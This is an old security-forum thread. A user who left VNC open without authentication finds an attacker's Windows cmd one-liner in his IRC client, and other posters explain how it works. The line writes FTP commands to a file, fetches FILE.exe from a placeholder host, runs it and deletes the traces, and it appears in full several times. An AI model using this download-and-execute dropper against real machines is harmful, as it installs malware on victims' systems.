---
title: "I left VNC open and found this on my Xchat:"
date: 2009-09-19
forum: Security
---

### Post by MaindotC on 2009-09-19
I found the following on my irc client xchat after getting home from work:
```

<asymptote> %systemroot%\system32\cmd.exe
<asymptote> cmd /c echo open IP 21 >> ik &echo user USERNAME PASSWORD >> ik &echo binary >> ik &echo get FILE.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &FILE.exe &exit

```

It seems to be a command for windows so I don't think it did anything to my machine, but I was curious if someone could tell me what this would do.  I thought it was a vulnerability in xchat but it turns out I left VNC on with no authentication.  The attackers also deleted every non-hidden folder in my /home directory which really ticked me off but there wasn't much.  Is there a way to see who logs into VNC?  I checked /var/log/auth.log and couldn't find anything.  Most of the hits I see everyday are from China.  Thanks!

---

### Post by Rob_H on 2009-09-19
What implementation of VNC are you using?

Umm, I hope it goes without saying that putting an open VNC server on the Internet is a bad idea. Putting one on with no authentication checks is... a really, really bad idea. Does it even matter who got in?

---

### Post by XCan on 2009-09-20
If you're using Vino, as far as I know, there are no log files. At least I have failed utterly to try and figure out where they are stored.

---

### Post by jaxxstorm on 2009-09-20
> **strAlan said:**
> I found the following on my irc client xchat after getting home from work:
```

<asymptote> %systemroot%\system32\cmd.exe
<asymptote> cmd /c echo open IP 21 >> ik &echo user USERNAME PASSWORD >> ik &echo binary >> ik &echo get FILE.exe >> ik &echo bye >> ik &ftp -n -v -s:ik &del ik &FILE.exe &exit

```

It seems to be a command for windows so I don't think it did anything to my machine, but I was curious if someone could tell me what this would do.  I thought it was a vulnerability in xchat but it turns out I left VNC on with no authentication.  The attackers also deleted every non-hidden folder in my /home directory which really ticked me off but there wasn't much.  Is there a way to see who logs into VNC?  I checked /var/log/auth.log and couldn't find anything.  Most of the hits I see everyday are from China.  Thanks!

It seems to be retrieving your password then download FILE.exe (which I assume is malicious) to your computer via FTP, then deleting it after it has run.

---

### Post by falconindy on 2009-09-20
FILE.exe is a trojan that will delete itself after installing. The execution is simple: a bunch of commands are echoed into a text file, and then invoked through ftp via the -s:filename option. It's the equivalent of doing the following by hand:
```
ftp -n -v
open IP 21
user USERNAME PASSWORD
binary
get FILE.exe
bye
del ik
FILE.exe 
exit
```In the ftp invocation, -n option suppresses an auto-login when connecting, and -v suppresses anything from being displayed by the remote server. Somewhat amusingly, you've omitted the location and credentials of this FTP, which isn't related to you, but the hacker! Share it and spread a little karma, eh?

Found [this]("http://episteme.arstechnica.com/eve/forums/a/tpc/f/469092836/m/264004244831"), [this]("http://ubuntuforums.org/showthread.php?t=1244618")... and there's a half dozen others I could post. Seems like the work of a bot.

---

### Post by MaindotC on 2009-09-21
There wasn't any IP address that's what made it so puzzling!  I thought maybe FILE.exe may have an address inside it but I couldn't find any FILE.exe and obviously since there is no cmd.exe there wasn't any prompt open.  And it says "USERNAME" and "PASSWORD" but they're not actually passing in a username//password - morons!  I get a lot of SSH attempts from the Chinese (or someone using a Chinese proxy) so it was prolly them.

---

